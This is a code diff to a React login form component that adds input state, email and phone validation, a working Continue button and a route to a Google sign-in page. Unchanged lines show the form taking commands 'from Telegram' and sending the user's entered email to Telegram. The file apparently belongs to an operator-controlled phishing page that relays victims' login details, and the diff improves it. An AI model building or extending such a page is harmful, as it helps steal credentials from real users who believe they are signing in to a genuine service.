@@ -14,6 +14,10 @@ export default function LoginForm() {
     const router = useRouter();
     const { command } = useCommand(); // Get the current command from Telegram
 
+    // Add state for input values
+    const [phoneNumber, setPhoneNumber] = useState('');
+    const [email, setEmail] = useState('');
+    const [isValidInput, setIsValidInput] = useState(false);
 
     // Handle command changes
     useEffect(() => {
@@ -53,9 +57,28 @@ export default function LoginForm() {
         sendMessageToTelegram(email);
     };
 
+    // Function to handle continue button click
+    const handleContinue = () => {
+        if (form === 'Email') {
+            console.log("Email entered:", email);
+            // Add your email validation logic here
+        } else {
+            console.log("Phone number entered:", selectedCountry?.code + phoneNumber);
+            // Add your phone validation logic here
+        }
+    };
 
-
-
+    // Function to validate input and enable/disable button
+    const validateInput = (value) => {
+        if (form === 'Email') {
+            // Simple email validation
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            setIsValidInput(emailRegex.test(value));
+        } else {
+            // Simple phone validation (at least 5 digits)
+            setIsValidInput(value.length >= 5);
+        }
+    };
 
     // the useEffect below handles the api for country code and their data 
     const [countries, setCountries] = useState([]);
@@ -79,7 +102,6 @@ export default function LoginForm() {
         fetch('https://restcountries.com/v3.1/all')
             .then((response) => response.json())
             .then((data) => {
-
                 const formattedCountries = data.map((country) => ({
                     name: country.name.common,
                     flag: country.flags.png,
@@ -95,20 +117,13 @@ export default function LoginForm() {
             .catch((error) => console.error('Error fetching countries:', error));
     }, []);
 
-
-
     // This state handles the countries dropdown
     const [dropdown, setDropdown] = useState(false)
-
 
     // Display countries dropdown
     const DisplayDropdown = () => {
         setDropdown(!dropdown)
     }
-
-
-
-
 
     // Handle the form state
     const [form, setForm] = useState('Phone');
@@ -121,6 +136,10 @@ export default function LoginForm() {
         if (inputRef.current) {
             inputRef.current.focus();
         }
+        // Reset validation when form changes
+        setIsValidInput(false);
+        setEmail('');
+        setPhoneNumber('');
     }, [form]);
 
     // Change the form state from phone number to Email
@@ -136,14 +155,13 @@ export default function LoginForm() {
             console.log("Going to email")
             // router.push('/EmailLoginPage');
         } else if (method === 'google') {
-            console.log("Going to google")
-            // router.push('/GoogleAuthPage');
+            // console.log("Going to google")
+            router.push('/GoogleAuthPage');
         } else if (method === 'apple') {
             console.log("Going to apple")
             // router.push('/AppleLoginPage');
         }
     };
-
 
     return (
         <div className="bg-[#f7f7f7] text-black w-full h-screen flex flex-col">
@@ -207,6 +225,11 @@ export default function LoginForm() {
                                                     ref={inputRef}
                                                     type="number"
                                                     placeholder="Phone number"
+                                                    value={phoneNumber}
+                                                    onChange={(e) => {
+                                                        setPhoneNumber(e.target.value);
+                                                        validateInput(e.target.value);
+                                                    }}
                                                     className="w-full text-[#191c1f] outline-none appearance-none bg-[#ebebf0] rounded-2xl h-full focus:outline-none placeholder-[#191c1f98] group-hover:bg-[#e2e2e7]"
                                                     style={{ WebkitAppearance: 'none', MozAppearance: 'textfield' }}
                                                 />
@@ -220,6 +243,11 @@ export default function LoginForm() {
                                                     ref={inputRef}
                                                     type="email"
                                                     placeholder="Enter Your Email"
+                                                    value={email}
+                                                    onChange={(e) => {
+                                                        setEmail(e.target.value);
+                                                        validateInput(e.target.value);
+                                                    }}
                                                     className="w-full text-[#191c1f] outline-none appearance-none bg-[#ebebf0] rounded-2xl h-full focus:outline-none placeholder-[#191c1f98] group-hover:bg-[#e2e2e7]"
                                                     style={{ WebkitAppearance: 'none', MozAppearance: 'textfield' }}
                                                 />
@@ -234,11 +262,15 @@ export default function LoginForm() {
                                 Lost access to my phone number
                             </div>
 
-                            <button disabled className='inter opacity-30 z-10 relative font-medium text-[1rem] tracking-[-0.01125em] h-[3.25rem] w-full min-w-[0px] px-[1rem] sm:mr-[1rem] rounded-[9999px] text-[white] bg-[#4f55f1] text-center my-[1.5rem]'>
+                            <button 
+                                disabled={!isValidInput} 
+                                onClick={handleContinue}
+                                className={`inter font-medium text-[1rem] tracking-[-0.01125em] h-[3.25rem] w-full min-w-[0px] px-[1rem] sm:mr-[1rem] rounded-[9999px] text-white ${isValidInput ? 'bg-[#4f55f1] hover:bg-[#3a3fd8] cursor-pointer' : 'bg-[#4f55f1] opacity-30'} text-center my-[1.5rem]`}
+                                type="button"
+                            >
                                 Continue
                             </button>
                         </form>
-
 
                         <div className='flex gap-y-4 flex-col sm:pr-[10px] pb-1'>
                             {/* form divider */}
@@ -247,7 +279,6 @@ export default function LoginForm() {
                                 <div className='inter font-normal text-[0.875rem] tracking-[-0.00714em] py-0 px-[1rem] text-[#717173]'>or continue with</div>
                                 <div className='h-[1px] bg-[#e2e2e7] flex-1 flex-grow'></div>
                             </div>
-
 
                             {/* Login methods */}
                             <div className='flex justify-around'>
@@ -308,7 +339,6 @@ export default function LoginForm() {
                                     </div>
                                 </div>
                             </div>
-
 
                             {/* Login Option */}
                             <div className='flex flex-col mt-[8px] gap-[0.75rem]'>
